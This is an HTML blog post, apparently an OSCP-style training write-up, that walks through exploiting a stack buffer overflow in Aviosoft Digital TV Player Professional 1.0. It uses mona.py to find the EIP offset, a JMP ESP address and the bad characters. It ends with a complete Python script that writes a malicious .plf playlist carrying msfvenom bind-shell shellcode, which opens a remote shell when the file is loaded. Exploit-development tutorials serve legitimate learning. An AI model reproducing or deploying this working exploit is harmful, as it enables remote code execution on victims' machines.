@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta itemprop="name" content="Aviosoft Digital TV Player Professional 1.0 Stack Buffer Overflow">
+  <title>Aviosoft Digital TV Player Professional 1.0 Stack Buffer Overflow</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta itemprop="description" content="Prequisites Windows XP SP3 (en-us) Immunity Debugger AviosoftDTVPlayerPro Triggering the overflow After some fuzzing the basic exploit can be create with the following python code. 1 #!/usr/bin/python -w 2 3 buffer = &quot;A&quot; * 2000 4 5 f = open(&quot;evil.plf&quot;,&quot;w&quot;) 6 f.write(buffer) 7 f.close() Opening this file with the vulnerable application results in an access violation with the following register values. Great, the EIP is under our control. Identifying EIP Offset In order to identify the correct offset of the overflow let&rsquo;s create a pattern and start again.">
+
+  
+  <meta itemprop="keywords" content="certifications,challenge,ctf,exploit,exploit-exercises,offensive-security,protostar,reverse-engineering,sans,seh," />
+  
+    <meta itemprop="wordCount" content="483">
+  
+
+  <meta property="og:title" content="Aviosoft Digital TV Player Professional 1.0 Stack Buffer Overflow" />
+  <meta property="og:description" content="Prequisites Windows XP SP3 (en-us) Immunity Debugger AviosoftDTVPlayerPro Triggering the overflow After some fuzzing the basic exploit can be create with the following python code. 1 #!/usr/bin/python -w 2 3 buffer = &quot;A&quot; * 2000 4 5 f = open(&quot;evil.plf&quot;,&quot;w&quot;) 6 f.write(buffer) 7 f.close() Opening this file with the vulnerable application results in an access violation with the following register values. Great, the EIP is under our control. Identifying EIP Offset In order to identify the correct offset of the overflow let&rsquo;s create a pattern and start again." />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="http://camelinc.info/blog/2014/05/Aviosoft-Digital-TV-Player-Professional-1.0-Stack-Buffer-Overflow/" />
+  
+
+  
+  <meta property="og:updated_time" content="2014-05-26 13:05:09 &#43;0000 UTC"/>
+  
+  
+  
+  
+
+  
+    <meta name="twitter:card" content="summary"/>
+  
+
+  
+  <meta name="twitter:title" content="Aviosoft Digital TV Player Professional 1.0 Stack Buffer Overflow"/>
+  <meta name="twitter:description" content="Prequisites Windows XP SP3 (en-us) Immunity Debugger AviosoftDTVPlayerPro Triggering the overflow After some fuzzing the basic exploit can be create with the following python code. 1 #!/usr/bin/python -w 2 3 buffer = &quot;A&quot; * 2000 4 5 f = open(&quot;evil.plf&quot;,&quot;w&quot;) 6 f.write(buffer) 7 f.close() Opening this file with the vulnerable application results in an access violation with the following register values. Great, the EIP is under our control. Identifying EIP Offset In order to identify the correct offset of the overflow let&rsquo;s create a pattern and start again."/>
+  
+  
+
+
+  <meta name="generator" content="Hugo 0.15" />
+  <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
+  <link href="http://camelinc.info//css/bootstrap.min.css" rel="stylesheet">
+  <link href="http://camelinc.info//css/hc.css" rel="stylesheet">
+
+  
+  <link rel="stylesheet" href="http://camelinc.info//css/zenburn.css" type="text/css" media="screen" />
+
+  
+
+  
+  <link rel="stylesheet" href="http://camelinc.info//lightbox/css/lightbox.css" type="text/css" media="screen">
+
+
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+  
+  
+</head>
+ 
+
+
+  <body>
+
+  
+<div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
+  <div id = "wrapper">
+
+<div class="navbar navbar-default" role="navigation">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a href="http://camelinc.info//"><p class="navbar-brand">camelinc</p></a>
+        </div>
+
+        <div class="navbar-collapse collapse">
+          <ul class="nav navbar-nav">
+					
+          <h2>http://camelinc.info/</h2>
+					
+					<li><a href="http://camelinc.info/about">About </a></li>
+					
+					<li><a href="http://camelinc.info/post">Posts </a></li>
+					
+          </ul>
+        </div>
+      </div>
+    </div>
+
+       
+       <div id="sidebar-wrapper">
+        <ul class="sidebar-nav">
+					<img src="/img/avatar.png" />
+          <li class="sidebar-brand"><a href="http://camelinc.info//"><h1 class="brand">camelinc</h1></a><h3></h3></li>
+          <hr />
+
+					
+						<li><a href="http://camelinc.info/about">About </a></li>
+					
+						<li><a href="http://camelinc.info/post">Posts </a></li>
+					
+          <hr />
+
+          <div id="social-wrapper">
+           
+             <li> <a href="https://twitter.com/camelinc"><i class="fa fa-twitter-square"></i> @twitter</a></li>
+           
+
+           
+             
+           
+
+           
+             
+           
+
+           
+             <li> <a href="https://github.com/camelinc"><i class="fa fa-github-square"></i> github</a> </li>
+           
+         </div>
+
+       </ul>
+     </div>
+
+     <div class="container">
+
+
+
+  <div id="article">
+    <div class="article-title">Aviosoft Digital TV Player Professional 1.0 Stack Buffer Overflow</div>
+    <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2014-05-26</small></p> <hr/>
+    <div class="post">
+      
+
+<h1 id="prequisites:dc6c0547b941be7f8dbf8bb054d9be75">Prequisites</h1>
+
+<ul>
+<li>Windows XP SP3 (en-us)</li>
+<li><a href="http://www.immunityinc.com/products-immdbg.shtml">Immunity Debugger</a></li>
+<li><a href="http://www.exploit-db.com/wp-content/themes/exploit/applications/55740fe6c4e56674125a1968a139ed36-AviosoftDTVPlayerPro.exe">AviosoftDTVPlayerPro</a></li>
+</ul>
+
+<h1 id="triggering-the-overflow:dc6c0547b941be7f8dbf8bb054d9be75">Triggering the overflow</h1>
+
+<p>After some fuzzing the basic exploit can be create with the following python code.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="lineno">1 </span><span class="c">#!/usr/bin/python -w</span>
+<span class="lineno">2 </span>
+<span class="lineno">3 </span><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">2000</span>
+<span class="lineno">4 </span>
+<span class="lineno">5 </span><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;evil.plf&quot;</span><span class="p">,</span><span class="s">&quot;w&quot;</span><span class="p">)</span>
+<span class="lineno">6 </span><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
+<span class="lineno">7 </span><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+
+
+<p>Opening this file with the vulnerable application results in an access violation with the following register values.</p>
+
+
+
+<figure >
+    <a href="/img/post/2014/dvdxplayer/initial_crash.png" data-lightbox="default" data-title="Register values at the access violation. EIP was overwritten with AAAA." >
+        <img src="/img/post/2014/dvdxplayer/initial_crash.png" alt="Register values at the access violation. EIP was overwritten with AAAA." >
+    </a>
+</figure>
+
+
+
+<p>Great, the EIP is under our control.</p>
+
+<h1 id="identifying-eip-offset:dc6c0547b941be7f8dbf8bb054d9be75">Identifying EIP Offset</h1>
+
+<p>In order to identify the correct offset of the overflow let&rsquo;s create a pattern and start again.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona pc 2000</span>
+</code></pre></div>
+
+
+<p>Mona.py creates a unique pattern that has to be opened by the application.
+At the time of the access violation the following register values are presented.</p>
+
+
+
+<figure >
+    <a href="/img/post/2014/dvdxplayer/find_pattern.png" data-lightbox="default" data-title="Identifying the offset of EIP" >
+        <img src="/img/post/2014/dvdxplayer/find_pattern.png" alt="Identifying the offset of EIP" >
+    </a>
+</figure>
+
+
+
+<p>Again, mona.py can help us to identify the correct offset of the overflow.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona findmsp</span>
+</code></pre></div>
+
+
+<p>This command does all the magic.
+The output is depicted in the following screenshot.</p>
+
+
+
+<figure >
+    <a href="/img/post/2014/dvdxplayer/findmsp.png" data-lightbox="default" data-title="Offset for EIP is 1109" >
+        <img src="/img/post/2014/dvdxplayer/findmsp.png" alt="Offset for EIP is 1109" >
+    </a>
+</figure>
+
+
+
+<p>We can also check the offset manually.</p>
+
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona pattern_offset 37694136</span>
+<span class="go"> - Pattern 6Ai7 (0x37694136) found in cyclic pattern at position 260</span>
+</code></pre></div>
+
+
+<p>Now we know, that we can overwrite the EIP after 260 bytes.
+After updating the initial script, we can now exactly overwrite EIP.</p>
+
+<p>
+
+<figure >
+    <a href="/img/post/2014/dvdxplayer/overwrite_eip.png" data-lightbox="default" data-title="Overwriting EIP with BBBB" >
+        <img src="/img/post/2014/dvdxplayer/overwrite_eip.png" alt="Overwriting EIP with BBBB" >
+    </a>
+</figure>
+
+</p>
+
+<h1 id="controlling-eip:dc6c0547b941be7f8dbf8bb054d9be75">Controlling EIP</h1>
+
+<p>Luckily, ESP points to the bytes after the BBBB.
+So let&rsquo;s identify a location that stores a suiteable JMP ESP.</p>
+
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona jmp -r esp</span>
+</code></pre></div>
+</p>
+
+<p>Mona.py can list all suitable JMP instructions.</p>
+
+<p>
+
+<figure >
+    <a href="/img/post/2014/dvdxplayer/jmp_esp.png" data-lightbox="default" data-title="JMP ESP instructions available in process memory." >
+        <img src="/img/post/2014/dvdxplayer/jmp_esp.png" alt="JMP ESP instructions available in process memory." >
+    </a>
+</figure>
+
+</p>
+
+<p>Let&rsquo;s choose one after identifying the bad characters.</p>
+
+<h1 id="identifying-bad-characters:dc6c0547b941be7f8dbf8bb054d9be75">Identifying Bad Characters</h1>
+
+<p>Next, we need to verify the valid charset for the exploit.
+Let&rsquo;s create a byte pattern and compare it against loaded data.</p>
+
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona bytearray -b &#39;\x00&#39;</span>
+</code></pre></div>
+</p>
+
+<p>The bad characters \x0A was identified at 0x0012f489.</p>
+
+<p>
+
+<figure >
+    <a href="/img/post/2014/dvdxplayer/bad_chars.png" data-lightbox="default" data-title="The pattern stops at offset 0x0012f489, which indicates a bad character." >
+        <img src="/img/post/2014/dvdxplayer/bad_chars.png" alt="The pattern stops at offset 0x0012f489, which indicates a bad character." >
+    </a>
+</figure>
+
+</p>
+
+<p>Iterating the previous steps until finally, all bad characters have been identified.</p>
+
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona compare -f c:\logs\DVDXPlayer\bytearray.bin</span>
+<span class="go">[+] Comparing with memory at location : 0x0012f480 (Stack)</span>
+<span class="go">!!! Hooray, normal shellcode unmodified !!!</span>
+<span class="go">Bytes omitted from input: 00 0a 1a</span>
+</code></pre></div>
+</p>
+
+<h1 id="adding-shellcode:dc6c0547b941be7f8dbf8bb054d9be75">Adding Shellcode</h1>
+
+<p>Finally, let&rsquo;s add a custom payload to the exploit code.
+With metasploit, we can just do that and update the python PoC.</p>
+
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b &#39;\x00\x0a\x1a&#39;</span>
+</code></pre></div>
+</p>
+
+<h1 id="the-exploit:dc6c0547b941be7f8dbf8bb054d9be75">The Exploit</h1>
+
+<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="lineno"> 1 </span><span class="c">#!/usr/bin/python -w</span>
+<span class="lineno"> 2 </span>
+<span class="lineno"> 3 </span><span class="kn">import</span> <span class="nn">struct</span>
+<span class="lineno"> 4 </span>
+<span class="lineno"> 5 </span><span class="c">#-------------------------------------------------------------------------------------------------------#</span>
+<span class="lineno"> 6 </span><span class="c"># msfvenom -p windows/console_bind_tcp LPORT=4444 -f python --platform win --arch x86 -b &#39;\x00\x0a\x1a&#39; #</span>
+<span class="lineno"> 7 </span><span class="c">#-------------------------------------------------------------------------------------------------------#</span>
+<span class="lineno"> 8 </span><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;</span><span class="se">\xbf\x11\xa0\x1c\x7c\xd9\xe9\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1</span><span class="s">&quot;</span>
+<span class="lineno"> 9 </span><span class="s">&quot;</span><span class="se">\x56\x83\xea\xfc\x31\x7a\x0f\x03\x7a\x1e\x42\xe9\x80\xc8\x0b</span><span class="s">&quot;</span>
+<span class="lineno">10 </span><span class="s">&quot;</span><span class="se">\x12\x79\x08\x6c\x9a\x9c\x39\xbe\xf8\xd5\x6b\x0e\x8a\xb8\x87</span><span class="s">&quot;</span>
+<span class="lineno">11 </span><span class="s">&quot;</span><span class="se">\xe5\xde\x28\x1c\x8b\xf6\x5f\x95\x26\x21\x51\x26\x87\xed\x3d</span><span class="s">&quot;</span>
+<span class="lineno">12 </span><span class="s">&quot;</span><span class="se">\xe4\x89\x91\x3f\x38\x6a\xab\x8f\x4d\x6b\xec\xf2\xbd\x39\xa5</span><span class="s">&quot;</span>
+<span class="lineno">13 </span><span class="s">&quot;</span><span class="se">\x79\x6f\xae\xc2\x3c\xb3\xcf\x04\x4b\x8b\xb7\x21\x8c\x7f\x02</span><span class="s">&quot;</span>
+<span class="lineno">14 </span><span class="s">&quot;</span><span class="se">\x2b\xdd\x2f\x19\x63\xc5\x44\x45\x54\xf4\x89\x95\xa8\xbf\xa6</span><span class="s">&quot;</span>
+<span class="lineno">15 </span><span class="s">&quot;</span><span class="se">\x6e\x5a\x3e\x6e\xbf\xa3\x70\x4e\x6c\x9a\xbc\x43\x6c\xda\x7b</span><span class="s">&quot;</span>
+<span class="lineno">16 </span><span class="s">&quot;</span><span class="se">\xbb\x1b\x10\x78\x46\x1c\xe3\x02\x9c\xa9\xf6\xa5\x57\x09\xd3</span><span class="s">&quot;</span>
+<span class="lineno">17 </span><span class="s">&quot;</span><span class="se">\x54\xb4\xcc\x90\x5b\x71\x9a\xff\x7f\x84\x4f\x74\x7b\x0d\x6e</span><span class="s">&quot;</span>
+<span class="lineno">18 </span><span class="s">&quot;</span><span class="se">\x5b\x0d\x55\x55\x7f\x55\x0e\xf4\x26\x33\xe1\x09\x38\x9b\x5e</span><span class="s">&quot;</span>
+<span class="lineno">19 </span><span class="s">&quot;</span><span class="se">\xac\x32\x0e\x8b\xd6\x18\x47\x78\xe5\xa2\x97\x16\x7e\xd0\xa5</span><span class="s">&quot;</span>
+<span class="lineno">20 </span><span class="s">&quot;</span><span class="se">\xb9\xd4\x7e\x86\x32\xf3\x79\xe9\x69\x43\x15\x14\x91\xb4\x3f</span><span class="s">&quot;</span>
+<span class="lineno">21 </span><span class="s">&quot;</span><span class="se">\xd3\xc5\xe4\x57\xf2\x65\x6f\xa8\xfb\xb0\x20\xf8\x53\x6a\x81</span><span class="s">&quot;</span>
+<span class="lineno">22 </span><span class="s">&quot;</span><span class="se">\xa8\x13\xda\x69\xa3\x9b\x05\x89\xcc\x71\x30\x8d\x02\xa1\x11</span><span class="s">&quot;</span>
+<span class="lineno">23 </span><span class="s">&quot;</span><span class="se">\x7a\x67\x55\x84\x26\xee\xb3\xcc\xc6\xa6\x6c\x78\x25\x9d\xa4</span><span class="s">&quot;</span>
+<span class="lineno">24 </span><span class="s">&quot;</span><span class="se">\x1f\x56\xf7\x98\x88\xc0\x4f\xf7\x0e\xee\x4f\xdd\x3d\x43\xe7</span><span class="s">&quot;</span>
+<span class="lineno">25 </span><span class="s">&quot;</span><span class="se">\xb6\xb5\x8f\x3c\xa6\xca\x85\x14\xa1\xf3\x4e\xee\xdf\xb6\xef</span><span class="s">&quot;</span>
+<span class="lineno">26 </span><span class="s">&quot;</span><span class="se">\xef\xf5\x20\x93\x62\x92\xb0\xda\x9e\x0d\xe7\x8b\x51\x44\x6d</span><span class="s">&quot;</span>
+<span class="lineno">27 </span><span class="s">&quot;</span><span class="se">\x26\xcb\xfe\x93\xbb\x8d\x39\x17\x60\x6e\xc7\x96\xe5\xca\xe3</span><span class="s">&quot;</span>
+<span class="lineno">28 </span><span class="s">&quot;</span><span class="se">\x88\x33\xd2\xaf\xfc\xeb\x85\x79\xaa\x4d\x7c\xc8\x04\x04\xd3</span><span class="s">&quot;</span>
+<span class="lineno">29 </span><span class="s">&quot;</span><span class="se">\x82\xc0\xd1\x1f\x15\x96\xdd\x75\xe3\x76\x6f\x20\xb2\x89\x40</span><span class="s">&quot;</span>
+<span class="lineno">30 </span><span class="s">&quot;</span><span class="se">\xa4\x32\xf2\xbc\x54\xbc\x29\x05\x64\xf7\x73\x2c\xed\x5e\xe6</span><span class="s">&quot;</span>
+<span class="lineno">31 </span><span class="s">&quot;</span><span class="se">\x6c\x70\x61\xdd\xb3\x8d\xe2\xd7\x4b\x6a\xfa\x92\x4e\x36\xbc</span><span class="s">&quot;</span>
+<span class="lineno">32 </span><span class="s">&quot;</span><span class="se">\x4f\x23\x27\x29\x6f\x90\x48\x78</span><span class="s">&quot;</span><span class="p">)</span>
+<span class="lineno">33 </span>
+<span class="lineno">34 </span><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">260</span>
+<span class="lineno">35 </span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt; L&#39;</span><span class="p">,</span> <span class="mh">0x6405c20b</span><span class="p">)</span> <span class="c">#jmp esp [MediaPlayerCtrl.dll]</span>
+<span class="lineno">36 </span><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span> <span class="o">*</span> <span class="mi">32</span>
+<span class="lineno">37 </span><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">shellcode</span>
+<span class="lineno">38 </span>
+<span class="lineno">39 </span><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&quot;evil.plf&quot;</span><span class="p">,</span><span class="s">&quot;w&quot;</span><span class="p">)</span>
+<span class="lineno">40 </span><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
+<span class="lineno">41 </span><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+</p>
+
+<p>By loading the plf file, the payload is executed.</p>
+
+<p>
+
+<figure >
+    <a href="/img/post/2014/dvdxplayer/bind_shell.png" data-lightbox="default" data-title="Local listening services before and after bind shell is started by opening the custom plf file" >
+        <img src="/img/post/2014/dvdxplayer/bind_shell.png" alt="Local listening services before and after bind shell is started by opening the custom plf file" >
+    </a>
+</figure>
+
+</p>
+
+<h1 id="links-and-references:dc6c0547b941be7f8dbf8bb054d9be75">Links and References</h1>
+
+<ul>
+<li><a href="http://www.exploit-db.com/exploits/18109/">EDB-ID: 18109</a></li>
+<li><a href="http://www.exploit-db.com/exploits/22932/">EDB-ID: 22932</a></li>
+<li><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/">Exploit writing tutorial part 1 : Stack Based Overflows</a></li>
+</ul>
+
+    </div>
+  </div>
+
+  <ul class="pager">
+    
+
+    
+      
+        &nbsp;<li class="previous"><a href="http://camelinc.info/blog/2014/05/Offensive-Security-Certified-Professional/"> Offensive Security Certified Professional</a></li>
+      
+    
+    
+      
+        &nbsp;<li class="next"><a href="http://camelinc.info/blog/2014/05/Easy-RM-to-MP3-Converter/"> Easy RM to MP3 Converter</a></li>
+      
+    
+  </ul>
+
+
+
+<footer>
+
+  <p class="text-muted credit">&copy; . All rights reserved. </p>
+    </footer>
+
+  
+  
+
+  <script type="text/javascript" src="/js/jquery-2.1.4.js"></script>
+
+  <script src="/js/bootstrap.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+  <script type="text/javascript" src="/js/hc.js"></script>
+
+  
+  <script type="text/javascript" src="/lightbox/js/lightbox.js"></script>
+
+  
+
+</footer>
+
+
+	</body>
+</html>
